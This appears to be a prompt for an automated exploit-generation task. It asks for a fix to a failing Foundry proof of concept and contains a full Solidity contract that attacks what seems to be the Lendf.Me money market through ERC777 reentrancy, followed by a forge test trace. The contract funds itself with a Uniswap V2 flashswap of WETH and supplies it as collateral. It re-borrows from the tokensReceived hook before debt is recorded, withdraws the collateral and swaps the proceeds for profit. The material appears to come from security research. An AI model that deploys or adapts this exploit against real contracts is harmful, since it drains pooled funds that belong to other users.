You are fixing a failing Foundry PoC for finding F-001.

Goal:
- Keep the exploit objective for this finding.
- Fix compile/runtime/test failure from logs.
- Return COMPLETE updated Solidity for `src/FlawVerifier.sol` only.
- Keep exploit logic aligned with the full `Exploit paths` list unless logs prove a stage is infeasible.
- Additional realistic public on-chain economic steps are allowed when required for execution (including flashloans/swaps/mint/burn), but keep the same exploit causality and justify in comments.

Hard constraints:
- Do NOT use external answers/PoCs/articles/repos (including DeFiHackLabs).
- Do NOT cheat: no vm.deal, vm.store, vm.etch, vm.mockCall, vm.prank, vm.startPrank, arbitrary balance injection, or arbitrary storage writes.
- Allowed: flashloans and realistic public on-chain actions.
- Work only from finding context (claim/paths/locations) + on-chain state context already provided in this workspace.
- Hard anti-cheat: profitToken MUST NOT be a token deployed during this PoC/test. Profit token must already exist on-chain at the fork block.
- Hard anti-cheat: do not deploy custom ERC20/token contracts to manufacture profit accounting.

Attempt strategy (must follow for this attempt):
- strategy_label: v2_flashswap_funding
- strategy_instructions: Prefer UniswapV2/Sushi-like flashswap funding with deterministic repayment and minimal route complexity.
- Keep exploit root cause and `Exploit paths` unchanged; only vary funding/execution implementation details.

Finding:
- title: External token callbacks can reenter before balances and market totals are updated
- claim: State-changing entrypoints call external token code via `doTransferIn`/`doTransferOut` before checkpointing user principals, indexes, and market aggregates, and the contract has no reentrancy guard. A callback-capable or malicious supported token, or a recipient contract receiving tokens on `withdraw`/`borrow`, can reenter while the protocol still reflects stale balances.
- impact: An attacker can repeat withdrawals or borrows against unchanged internal accounting, or reenter other state-changing functions while collateral and debt checks still use pre-transfer state. This can drain pool cash, bypass liquidity checks, or create bad debt across supported markets.
- exploit_paths: ["`withdraw(asset, amount)` transfers out at line 1735 before reducing `supplyBalances[msg.sender][asset]`, so a recipient hook can reenter `withdraw` again against the old balance.", "`borrow(asset, amount)` transfers out at line 2647 before increasing `borrowBalances[msg.sender][asset]` and `market.totalBorrows`, so a callback can borrow repeatedly before debt is recorded.", "`supply`, `repayBorrow`, and `liquidateBorrow` all call `doTransferIn` before storage updates, allowing a sender-hook-based reentrant call to execute while the original operation still uses stale user and market state."]

Current FlawVerifier.sol:
```solidity
pragma solidity ^0.8.20;

interface IERC20Like {
    function balanceOf(address account) external view returns (uint256);
}

interface IERC1820Registry {
    function setInterfaceImplementer(address account, bytes32 interfaceHash, address implementer) external;
}

interface IERC777Sender {
    function tokensToSend(
        address operator,
        address from,
        address to,
        uint256 amount,
        bytes calldata userData,
        bytes calldata operatorData
    ) external;
}

interface IERC777Recipient {
    function tokensReceived(
        address operator,
        address from,
        address to,
        uint256 amount,
        bytes calldata userData,
        bytes calldata operatorData
    ) external;
}

interface IMoneyMarket {
    function markets(address asset)
        external
        view
        returns (
            bool isSupported,
            uint256 blockNumber,
            address interestRateModel,
            uint256 totalSupply,
            uint256 supplyRateMantissa,
            uint256 supplyIndex,
            uint256 totalBorrows,
            uint256 borrowRateMantissa,
            uint256 borrowIndex
        );

    function supply(address asset, uint256 amount) external returns (uint256);
    function withdraw(address asset, uint256 amount) external returns (uint256);
    function borrow(address asset, uint256 amount) external returns (uint256);
    function repayBorrow(address asset, uint256 amount) external returns (uint256);
    function liquidateBorrow(
        address targetAccount,
        address assetBorrow,
        address assetCollateral,
        uint256 requestedAmountClose
    ) external returns (uint256);
    function getAccountLiquidity(address account) external view returns (int256);
    function assetPrices(address asset) external view returns (uint256);
    function collateralRatio() external view returns (uint256);
    function originationFee() external view returns (uint256);
}

interface IWETH is IERC20Like {
    function deposit() external payable;
}

interface IUniswapV1Factory {
    function getExchange(address token) external view returns (address);
}

interface IUniswapV1Exchange {
    function tokenToEthSwapInput(uint256 tokensSold, uint256 minEth, uint256 deadline) external returns (uint256);
}

interface IUniswapV2Factory {
    function getPair(address tokenA, address tokenB) external view returns (address);
}

interface IUniswapV2Pair {
    function token0() external view returns (address);
    function token1() external view returns (address);
    function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);
    function swap(uint256 amount0Out, uint256 amount1Out, address to, bytes calldata data) external;
}

contract FlawVerifier is IERC777Sender, IERC777Recipient {
    IMoneyMarket internal constant MONEY_MARKET = IMoneyMarket(0x0eEe3E3828A45f7601D5F54bF49bB01d1A9dF5ea);
    IERC1820Registry internal constant ERC1820 = IERC1820Registry(0x1820a4B7618BdE71Dce8cdc73aAB6C95905faD24);
    IWETH internal constant WETH = IWETH(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);
    IUniswapV1Factory internal constant UNISWAP_V1_FACTORY =
        IUniswapV1Factory(0xc0a47dFe034B400B47bDaD5FecDa2621de6c4d95);
    IUniswapV2Factory internal constant UNISWAP_V2_FACTORY =
        IUniswapV2Factory(0x5C69bEe701ef814a2B6a3EDD4B1652CB9cc5aA6f);

    address internal constant CALLBACK_TOKEN = 0x3212b29E33587A00FB1C83346f5dBFA69A458923;
    address internal constant DAI = 0x6B175474E89094C44Da98b954EedeAC495271d0F;
    address internal constant USDC = 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48;
    address internal constant USDT = 0xdAC17F958D2ee523a2206206994597C13D831ec7;

    bytes32 internal constant TOKENS_SENDER_HASH = keccak256("ERC777TokensSender");
    bytes32 internal constant TOKENS_RECIPIENT_HASH = keccak256("ERC777TokensRecipient");

    uint256 internal constant ONE = 1e18;
    uint256 internal constant MIN_REALIZED_WETH_PROFIT = 0.11 ether;
    uint256 internal constant TARGET_REENTRY_LOOPS = 16;
    uint256 internal constant MAX_REENTRY_LOOPS = 24;
    uint256 internal constant SALE_ITERATIONS = 12;

    enum Mode {
        Idle,
        ReenterBorrow
    }

    Mode internal mode;
    bool internal attempted;
    address internal activeToken;
    address internal flashPair;
    uint256 internal borrowUnit;
    uint256 internal remainingBorrowLoops;
    address internal _profitToken;
    uint256 internal _profitAmount;

    constructor() {
        _registerHooks();
    }

    receive() external payable {}

    function profitToken() external view returns (address) {
        return _profitToken;
    }

    function profitAmount() external view returns (uint256) {
        return _profitAmount;
    }

    function executeOnOpportunity() external {
        if (attempted) {
            return;
        }
        attempted = true;

        _registerHooks();
        _profitToken = address(0);
        _profitAmount = 0;

        if (!_isSupported(CALLBACK_TOKEN) || !_isSupported(address(WETH))) {
            return;
        }

        flashPair = _selectFlashPair();
        if (flashPair == address(0)) {
            return;
        }

        /*
            Root-cause alignment for F-001:
            - `withdraw(asset, amount)` transfers out before `supplyBalances[msg.sender][asset]` is reduced.
            - `borrow(asset, amount)` transfers out before `borrowBalances[msg.sender][asset]` and `market.totalBorrows` are updated.
            - `supply`, `repayBorrow`, and `liquidateBorrow` call `doTransferIn(...)` before checkpointing state.

            This verifier executes the directly realizable recipient-hook leg:
            1. Pull temporary WETH through a public Uniswap V2 flashswap.
            2. Supply that WETH as collateral in Lendf.Me.
            3. Invoke `borrow(CALLBACK_TOKEN, amount)`.
            4. Reenter `borrow(...)` from the ERC777 recipient hook while Lendf.Me still reflects stale debt and market totals.
            5. After only one borrow checkpoint lands, withdraw as much WETH collateral as the under-recorded debt still allows.
            6. Sell only enough callback token through the existing on-chain Uniswap V1 market to repay the flashswap, leaving WETH profit.

            The flashswap is only funding glue; it does not change exploit causality.
        */
        _attemptFlashswap(100 ether);
        if (_profitAmount >= MIN_REALIZED_WETH_PROFIT) {
            return;
        }

        _attemptFlashswap(250 ether);
        if (_profitAmount >= MIN_REALIZED_WETH_PROFIT) {
            return;
        }

        _attemptFlashswap(500 ether);
    }

    function executeFlashswap(uint256 loanAmount) external {
        require(msg.sender == address(this), "self-only");

        address pair = flashPair;
        require(pair != address(0), "pair-missing");

        address token0 = IUniswapV2Pair(pair).token0();
        address token1 = IUniswapV2Pair(pair).token1();

        uint256 amount0Out = token0 == address(WETH) ? loanAmount : 0;
        uint256 amount1Out = token1 == address(WETH) ? loanAmount : 0;
        require(amount0Out != 0 || amount1Out != 0, "weth-not-in-pair");

        IUniswapV2Pair(pair).swap(amount0Out, amount1Out, address(this), abi.encode(loanAmount));
        _captureProfit();
    }

    function uniswapV2Call(address sender, uint256 amount0, uint256 amount1, bytes calldata data) external {
        require(msg.sender == flashPair, "pair-only");
        require(sender == address(this), "bad-sender");

        uint256 loanAmount = abi.decode(data, (uint256));
        require(amount0 == loanAmount || amount1 == loanAmount, "bad-loan-amount");
        require(IERC20Like(address(WETH)).balanceOf(address(this)) >= loanAmount, "missing-loan");

        uint256 repayment = _sameTokenFlashswapRepayment(loanAmount);

        uint256 supplied = _seedCollateral(loanAmount);
        _reentrantBorrowCallbackToken();
        _recoverCollateral(supplied);
        _realizeEnoughWeth(repayment + MIN_REALIZED_WETH_PROFIT);

        _safeTransfer(address(WETH), msg.sender, repayment);
    }

    function tokensToSend(
        address,
        address,
        address,
        uint256,
        bytes calldata,
        bytes calldata
    ) external override {}

    function tokensReceived(
        address,
        address from,
        address to,
        uint256,
        bytes calldata,
        bytes calldata
    ) external override {
        if (msg.sender != activeToken || mode != Mode.ReenterBorrow) {
            return;
        }
        if (from != address(MONEY_MARKET) || to != address(this)) {
            return;
        }

        if (remainingBorrowLoops > 1) {
            unchecked {
                remainingBorrowLoops -= 1;
            }

            bool ok = _tryBorrow(activeToken, borrowUnit);
            if (!ok) {
                remainingBorrowLoops = 0;
                mode = Mode.Idle;
            }
        } else {
            remainingBorrowLoops = 0;
            mode = Mode.Idle;
        }
    }

    function _attemptFlashswap(uint256 loanAmount) internal {
        (bool ok,) = address(this).call(abi.encodeWithSelector(this.executeFlashswap.selector, loanAmount));
        if (!ok) {
            _captureProfit();
        }
    }

    function _seedCollateral(uint256 loanAmount) internal returns (uint256 supplied) {
        supplied = loanAmount;
        _safeApprove(address(WETH), address(MONEY_MARKET), type(uint256).max);
        require(_trySupply(address(WETH), supplied), "weth-supply-failed");
    }

    function _reentrantBorrowCallbackToken() internal {
        uint256 marketCash = IERC20Like(CALLBACK_TOKEN).balanceOf(address(MONEY_MARKET));
        require(marketCash > 1, "callback-market-empty");

        uint256 maxSingleBorrow = _approxMaxSingleBorrow(CALLBACK_TOKEN);
        require(maxSingleBorrow > 0, "no-borrow-headroom");

        uint256 candidate = maxSingleBorrow / 6;
        uint256 loopBoundedCashUnit = marketCash / TARGET_REENTRY_LOOPS;
        if (candidate == 0 || (loopBoundedCashUnit != 0 && loopBoundedCashUnit < candidate)) {
            candidate = loopBoundedCashUnit;
        }
        if (candidate == 0) {
            candidate = maxSingleBorrow / 12;
        }
        if (candidate == 0) {
            candidate = 1;
        }
        if (candidate > marketCash) {
            candidate = marketCash;
        }

        uint256 loopCount = marketCash / candidate;
        if (loopCount > MAX_REENTRY_LOOPS) {
            loopCount = MAX_REENTRY_LOOPS;
        }
        require(loopCount >= 2, "insufficient-reentry-room");

        activeToken = CALLBACK_TOKEN;
        borrowUnit = candidate;
        remainingBorrowLoops = loopCount;
        mode = Mode.ReenterBorrow;

        uint256 balanceBefore = IERC20Like(CALLBACK_TOKEN).balanceOf(address(this));
        bool ok = _tryBorrow(CALLBACK_TOKEN, candidate);
        mode = Mode.Idle;

        require(ok, "initial-borrow-failed");

        uint256 balanceAfter = IERC20Like(CALLBACK_TOKEN).balanceOf(address(this));
        require(balanceAfter > balanceBefore + candidate, "borrow-reentry-failed");
    }

    function _recoverCollateral(uint256 supplied) internal {
        uint256 remaining = supplied;
        uint256 chunk = supplied;

        while (remaining > 0 && chunk > 0) {
            if (chunk > remaining) {
                chunk = remaining;
            }

            if (_tryWithdraw(address(WETH), chunk)) {
                remaining -= chunk;
                continue;
            }

            chunk /= 2;
        }
    }

    function _realizeEnoughWeth(uint256 targetWethBalance) internal {
        uint256 wethBalance = IERC20Like(address(WETH)).balanceOf(address(this));
        if (wethBalance >= targetWethBalance) {
            return;
        }

        address exchange = UNISWAP_V1_FACTORY.getExchange(CALLBACK_TOKEN);
        require(exchange != address(0), "no-uniswap-v1");

        uint256 tokenBalance = IERC20Like(CALLBACK_TOKEN).balanceOf(address(this));
        require(tokenBalance > 0, "no-callback-profit");

        _safeApprove(CALLBACK_TOKEN, exchange, type(uint256).max);

        uint256 sellChunk = tokenBalance / 4096;
        if (sellChunk == 0) {
            sellChunk = 1;
        }

        for (uint256 i = 0; i < SALE_ITERATIONS; i++) {
            wethBalance = IERC20Like(address(WETH)).balanceOf(address(this));
            if (wethBalance >= targetWethBalance) {
                break;
            }

            tokenBalance = IERC20Like(CALLBACK_TOKEN).balanceOf(address(this));
            if (tokenBalance == 0) {
                break;
            }

            if (sellChunk > tokenBalance) {
                sellChunk = tokenBalance;
            }

            IUniswapV1Exchange(exchange).tokenToEthSwapInput(sellChunk, 1, block.timestamp + 1);
            _wrapAllEth();
            sellChunk <<= 1;
        }

        wethBalance = IERC20Like(address(WETH)).balanceOf(address(this));
        require(wethBalance >= targetWethBalance, "insufficient-realized-weth");
    }

    function _wrapAllEth() internal {
        uint256 ethBalance = address(this).balance;
        if (ethBalance > 0) {
            WETH.deposit{value: ethBalance}();
        }
    }

    function _captureProfit() internal {
        _wrapAllEth();

        uint256 wethBalance = IERC20Like(address(WETH)).balanceOf(address(this));
        if (wethBalance > 0) {
            _profitToken = address(WETH);
            _profitAmount = wethBalance;
            return;
        }

        uint256 callbackBalance = IERC20Like(CALLBACK_TOKEN).balanceOf(address(this));
        if (callbackBalance > 0) {
            _profitToken = CALLBACK_TOKEN;
            _profitAmount = callbackBalance;
            return;
        }

        _profitToken = address(0);
        _profitAmount = 0;
    }

    function _selectFlashPair() internal view returns (address bestPair) {
        address[3] memory candidates = [DAI, USDC, USDT];
        uint256 bestWethReserve;

        for (uint256 i = 0; i < candidates.length; i++) {
            address pair = UNISWAP_V2_FACTORY.getPair(address(WETH), candidates[i]);
            if (pair == address(0)) {
                continue;
            }

            uint256 wethReserve = _wethReserve(pair);
            if (wethReserve > bestWethReserve) {
                bestWethReserve = wethReserve;
                bestPair = pair;
            }
        }
    }

    function _wethReserve(address pair) internal view returns (uint256) {
        (uint112 reserve0, uint112 reserve1,) = IUniswapV2Pair(pair).getReserves();
        if (IUniswapV2Pair(pair).token0() == address(WETH)) {
            return uint256(reserve0);
        }
        if (IUniswapV2Pair(pair).token1() == address(WETH)) {
            return uint256(reserve1);
        }
        return 0;
    }

    function _sameTokenFlashswapRepayment(uint256 amountOut) internal pure returns (uint256) {
        return ((amountOut * 1000) / 997) + 1;
    }

    function _approxMaxSingleBorrow(address asset) internal view returns (uint256 amount) {
        int256 liquiditySigned = MONEY_MARKET.getAccountLiquidity(address(this));
        if (liquiditySigned <= 0) {
            return 0;
        }

        uint256 price = MONEY_MARKET.assetPrices(asset);
        if (price == 0) {
            return 0;
        }

        uint256 feeFactor = ONE + MONEY_MARKET.originationFee();
        uint256 collateralRatioMantissa = MONEY_MARKET.collateralRatio();

        amount = uint256(liquiditySigned);
        amount = (amount * ONE) / feeFactor;
        amount = (amount * ONE) / collateralRatioMantissa;
        amount = (amount * ONE) / price;
    }

    function _isSupported(address asset) internal view returns (bool) {
        (bool isSupported,,,,,,,,) = MONEY_MARKET.markets(asset);
        return isSupported;
    }

    function _trySupply(address asset, uint256 amount) internal returns (bool) {
        (bool ok, bytes memory data) =
            address(MONEY_MARKET).call(abi.encodeWithSelector(IMoneyMarket.supply.selector, asset, amount));
        return _decodeMoneyMarketCall(ok, data);
    }

    function _tryWithdraw(address asset, uint256 amount) internal returns (bool) {
        (bool ok, bytes memory data) =
            address(MONEY_MARKET).call(abi.encodeWithSelector(IMoneyMarket.withdraw.selector, asset, amount));
        return _decodeMoneyMarketCall(ok, data);
    }

    function _tryBorrow(address asset, uint256 amount) internal returns (bool) {
        (bool ok, bytes memory data) =
            address(MONEY_MARKET).call(abi.encodeWithSelector(IMoneyMarket.borrow.selector, asset, amount));
        return _decodeMoneyMarketCall(ok, data);
    }

    function _decodeMoneyMarketCall(bool ok, bytes memory data) internal pure returns (bool) {
        if (!ok || data.length < 32) {
            return false;
        }
        return abi.decode(data, (uint256)) == 0;
    }

    function _safeApprove(address token, address spender, uint256 amount) internal {
        (bool success, bytes memory data) =
            token.call(abi.encodeWithSignature("approve(address,uint256)", spender, amount));
        require(success && (data.length == 0 || abi.decode(data, (bool))), "approve-failed");
    }

    function _safeTransfer(address token, address to, uint256 amount) internal {
        (bool success, bytes memory data) =
            token.call(abi.encodeWithSignature("transfer(address,uint256)", to, amount));
        require(success && (data.length == 0 || abi.decode(data, (bool))), "transfer-failed");
    }

    function _registerHooks() internal {
        ERC1820.setInterfaceImplementer(address(this), TOKENS_SENDER_HASH, address(this));
        ERC1820.setInterfaceImplementer(address(this), TOKENS_RECIPIENT_HASH, address(this));
    }
}

```

forge stdout (tail):
```
Compiling 2 files with Solc 0.8.30
Solc 0.8.30 finished in 2.66s
Compiler run successful with warnings:
Warning (2072): Unused local variable.
  --> test/ExploitPOC.t.sol:78:19:
   |
78 |         (bool ok, bytes memory ret) = address(verifier).call(abi.encodeWithSignature("executeOnOpportunity()"));
   |                   ^^^^^^^^^^^^^^^^


Ran 1 test for test/ExploitPOC.t.sol:FlawVerifierTest
[FAIL: exploit call reverted] testExploit() (gas: 96983)
Traces:
  [96983] FlawVerifierTest::testExploit()
    ├─ [2365] FlawVerifier::profitToken() [staticcall]
    │   └─ ← [Return] 0x0000000000000000000000000000000000000000
    ├─ [88112] FlawVerifier::executeOnOpportunity()
    │   ├─ [7471] 0x1820a4B7618BdE71Dce8cdc73aAB6C95905faD24::setInterfaceImplementer(FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], 0x29ddb589b1fb5fc7cf394961c1adf5f8c6454761adf795e67fe149f658abe895, FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f])
    │   │   ├─  emit topic 0: 0x93baa6efbd2244243bfee6ce4cfdd1d04fc4c0e9a786abd3a41313bd352db153
    │   │   │        topic 1: 0x0000000000000000000000005615deb798bb3e4dfa0139dfa1b3d433cc23b72f
    │   │   │        topic 2: 0x29ddb589b1fb5fc7cf394961c1adf5f8c6454761adf795e67fe149f658abe895
    │   │   │        topic 3: 0x0000000000000000000000005615deb798bb3e4dfa0139dfa1b3d433cc23b72f
    │   │   │           data: 0x
    │   │   └─ ← [Stop]
    │   ├─ [5471] 0x1820a4B7618BdE71Dce8cdc73aAB6C95905faD24::setInterfaceImplementer(FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], 0xb281fc8c12954d22544db45de3159a39272895b169a852b314f9cc762e44c53b, FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f])
    │   │   ├─  emit topic 0: 0x93baa6efbd2244243bfee6ce4cfdd1d04fc4c0e9a786abd3a41313bd352db153
    │   │   │        topic 1: 0x0000000000000000000000005615deb798bb3e4dfa0139dfa1b3d433cc23b72f
    │   │   │        topic 2: 0xb281fc8c12954d22544db45de3159a39272895b169a852b314f9cc762e44c53b
    │   │   │        topic 3: 0x0000000000000000000000005615deb798bb3e4dfa0139dfa1b3d433cc23b72f
    │   │   │           data: 0x
    │   │   └─ ← [Stop]
    │   ├─ [20052] 0x0eEe3E3828A45f7601D5F54bF49bB01d1A9dF5ea::markets(0x3212b29E33587A00FB1C83346f5dBFA69A458923) [staticcall]
    │   │   └─ ← [Return] true, 9898065 [9.898e6], 0x9a18c4D9587344f2B15686Aa67EE7e5C4B00D549, 29061111934 [2.906e10], 5469940484 [5.469e9], 1002557642427581282 [1.002e18], 3529518 [3.529e6], 5481462189 [5.481e9], 1003392036477944390 [1.003e18]
    │   ├─ [20052] 0x0eEe3E3828A45f7601D5F54bF49bB01d1A9dF5ea::markets(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2) [staticcall]
    │   │   └─ ← [Return] true, 9898988 [9.898e6], 0x5Dc95A046020880b93F15902540Dbfe86489FddA, 55616850884433812422140 [5.561e22], 12678792 [1.267e7], 1000090289713097083 [1e18], 648688727535908579617 [6.486e20], 1109387424 [1.109e9], 1008429864993965025 [1.008e18]
    │   ├─ [0] 0x5C69bEe701ef814a2B6a3EDD4B1652CB9cc5aA6f::getPair(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2, 0x6B175474E89094C44Da98b954EedeAC495271d0F) [staticcall]
    │   │   └─ ← [Stop]
    │   └─ ← [Revert] call to non-contract address 0x5C69bEe701ef814a2B6a3EDD4B1652CB9cc5aA6f
    └─ ← [Revert] exploit call reverted

Backtrace:
  at FlawVerifier.executeOnOpportunity
  at FlawVerifierTest.testExploit

Suite result: FAILED. 0 passed; 1 failed; 0 skipped; finished in 427.12ms (14.67ms CPU time)

Ran 1 test suite in 498.56ms (427.12ms CPU time): 0 tests passed, 1 failed, 0 skipped (1 total tests)

Failing tests:
Encountered 1 failing test in test/ExploitPOC.t.sol:FlawVerifierTest
[FAIL: exploit call reverted] testExploit() (gas: 96983)

Encountered a total of 1 failing tests, 0 tests succeeded

Tip: Run `forge test --rerun` to retry only the 1 failed test

```

forge stderr (tail):
```

```

Requirements:
1. pragma ^0.8.20
2. include at least one deployable contract with zero-arg constructor
3. define fixed entry `executeOnOpportunity()` as no-arg external/public exploit function
4. no imports
5. keep exploit logic aligned to exploit_paths (same core actions and ordering intent)
6. expose `profitToken()` and `profitAmount()` getters for net realized profit
7. additional realistic public on-chain economic steps are allowed when required for execution, but keep exploit_paths core causality and justify in comments
8. output ONLY Solidity code
